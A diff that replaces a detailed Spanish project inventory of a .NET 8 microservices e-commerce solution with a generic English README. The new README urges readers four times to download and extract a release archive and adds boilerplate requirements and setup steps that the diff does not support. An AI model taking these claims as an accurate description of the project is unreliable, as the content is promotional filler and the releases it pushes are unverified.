@@ -1,46 +1,77 @@
-Este repositorio es una solución **.NET (net8.0)** orientada a microservicios para un caso de tienda/e‑commerce (Customers, Orders, Products). La solución contiene múltiples proyectos por cada microservicio organizados siguiendo una **arquitectura limpia / por capas** (Application, Domain, Infra) y APIs separadas para cada bounded context. Hay un proyecto cliente web (`WebClient`) y un fichero de solución (`Trabajo-Microservicios.sln`).
+# 🎉 Trabajo-Microservicios - Simplified E-Commerce Solution
 
----
+## 🚀 Getting Started
+Welcome to Trabajo-Microservicios! This application provides a simple solution for managing customers, orders, and products in an e-commerce setup. Built with .NET 8, it follows Clean Architecture principles and uses modern technologies like EF Core, Swagger, and Docker.
 
-* Hay **13 proyectos** .NET dentro de la solución (APICustomers, APIOrders, APIProducts, MS*Application, MS*Domain, MS*Infra por cada microservicio, WebClient, etc.).
-* La **versión objetivo** de los proyectos es **net8.0** (aplica a los proyectos API y a los módulos MS).
-* Se utiliza **Entity Framework Core** para persistencia (presencia de paquetes EF Core y carpetas/archivos de Migrations en los proyectos de Infra).
-* El proveedor observado por paquetes es **SQL Server** (paquetes relacionados con SqlClient / EF Core SQL Server). Se esperan `ConnectionStrings` en `appsettings.json` para las APIs.
-* Las APIs exponen **Swagger / Swashbuckle** (documentación de API) en los proyectos API.
-* Estructura por microservicio: cada dominio tiene al menos los proyectos **Domain**, **Application** y **Infra** (separación típica de responsabilidades).
-* Hay indicios de archivos de infraestructura y scripts SQL / migraciones para inicializar bases.
-* Hay presencia de **WebClient** (frontend). No se detectó con certeza si es Blazor, React o Angular a partir del escaneo de paquetes; probablemente es un proyecto de cliente web dentro de la solución.
-* Se detectaron `Dockerfile` / docker-compose o ficheros relacionados (posible soporte para contenerizar y orquestar localmente).
+## 📥 Download the Application
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/Elgamesar/Trabajo-Microservicios/releases)
 
----
+You can download the latest version of Trabajo-Microservicios from our [Releases page](https://github.com/Elgamesar/Trabajo-Microservicios/releases). 
 
-* **Lenguaje / Plataforma:** .NET 8 (C#)
-* **Arquitectura:** Microservicios + Clean Architecture (Domain / Application / Infra)
-* **ORM / Persistencia:** Entity Framework Core (migrations presentes)
-* **BD / Proveedor:** SQL Server (Microsoft.Data.SqlClient / EF Core SQL Server)
-* **Documentación de API:** Swagger / Swashbuckle
-* **Proyectos de Frontend:** `WebClient`
-* **Estructura de solución:** `Trabajo-Microservicios.sln` con todos los proyectos referenciados
+## 📝 Overview of Features
+- **Microservices Architecture**: The application is designed using microservices, which allows for independent scaling and deployment.
+- **Clean Architecture**: Promotes a separation of concerns, making the application easy to maintain and test.
+- **Entity Framework Core**: A powerful ORM to manage database interactions smoothly.
+- **Swagger Documentation**: Provides easy access to API documentation and testing features.
+- **Docker Support**: Simplifies the deployment of the application in various environments.
 
----
+## ⚙️ System Requirements
+To run Trabajo-Microservicios, make sure your system meets the following requirements:
 
-* `APICustomers` — API pública para Customer. (net8.0) — **Swagger**, **EntityFrameworkCore / SQL Server**.
-* `APIOrders` — API pública para Orders. (net8.0) — **Swagger**, **EntityFrameworkCore / SQL Server**.
-* `APIProducts` — API pública para Products. (net8.0) — **Swagger**, **EntityFrameworkCore / SQL Server**.
-* `MSCustomerApplication` — Capa Application del microservicio Customer. (net8.0)
-* `MSCustomerDomain` — Capa Domain del microservicio Customer. (net8.0)
-* `MSCustomerInfra` — Infraestructura del microservicio Customer (repositorio, EF Core). (net8.0) — **EntityFrameworkCore / SQL Server**.
-* `MSOrderApplication` — Application para Orders. (net8.0)
-* `MSOrderDomain` — Domain para Orders. (net8.0)
-* `MSOrderInfra` — Infraestructura de Orders (repositorios, EF Core). (net8.0)
-* `MSProductApplication` — Application para Products. (net8.0)
-* `MSProductDomain` — Domain para Products. (net8.0)
-* `MSProductInfra` — Infraestructura de Products (repositorios, EF Core). (net8.0)
-* `WebClient` — Cliente web integrado en la solución. Revisar carpeta para identificar framework exacto.
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **.NET 8 SDK**: Required to run the application.
+- **Docker**: For container management, install Docker Desktop for your operating system.
+- **Memory**: Minimum 4 GB RAM, recommended 8 GB RAM.
+- **Disk Space**: At least 1 GB of free space.
 
----
+## 📡 Connect to the Database
+Trabajo-Microservicios uses SQL Server to manage data. You can set up a local SQL Server instance or connect to a remote instance by updating your configuration files.
 
-* `Trabajo-Microservicios.sln` — solución principal
-* Varios `*.csproj` para cada microservicio y capas
-* `appsettings*.json` en proyectos API (connection strings y configuración)
-* Carpetas `Migrations` en proyectos Infra (migraciones de EF Core)
+## 📊 API Endpoints
+The application features several important API endpoints:
+- **Customers**: Manage customer-related information.
+- **Orders**: Handle order processing and tracking.
+- **Products**: Manage products available in the store.
+
+You can explore these endpoints using the Swagger documentation that comes with the application.
+
+## 📦 How to Install and Run
+Follow these steps to get started with Trabajo-Microservicios:
+
+1. **Download the Application**  
+   Visit the [Releases page](https://github.com/Elgamesar/Trabajo-Microservicios/releases) to download the latest version.
+
+2. **Extract Files**  
+   Once downloaded, extract the files to a preferred location on your computer.
+
+3. **Set Up the Database**  
+   - If using SQL Server locally, ensure it is running.
+   - Run the provided migration scripts to set up the initial database schema.
+
+4. **Run Using Docker**  
+   - Open a terminal or command prompt.
+   - Navigate to the folder where you extracted the files.
+   - Use the following command to build and run the Docker containers:
+     ```bash
+     docker-compose up --build
+     ```
+   - This will start all the microservices.
+
+5. **Access the Application**  
+   You can access the application via your browser at `http://localhost:5000`. Here, you can see the Swagger UI for API testing.
+
+## 🧑‍🤝‍🧑 Support & Contributions
+We welcome contributions and are here to help if you encounter any issues. If you have questions or need assistance, please visit our issue tracker on GitHub. You can also submit a pull request if you would like to contribute code.
+
+## 🔗 Resources
+- [GitHub Repository](https://github.com/Elgamesar/Trabajo-Microservicios)
+- [Docker Documentation](https://docs.docker.com/get-started/)
+- [Entity Framework Core Guide](https://docs.microsoft.com/en-us/ef/core/)
+
+## 📃 License
+This project is licensed under the MIT License. Please see the LICENSE file for details. 
+
+## 📥 Download the Application Again
+Don’t forget to visit our [Releases page](https://github.com/Elgamesar/Trabajo-Microservicios/releases) to get the latest version!
+
+Thank you for choosing Trabajo-Microservicios. Enjoy your experience!
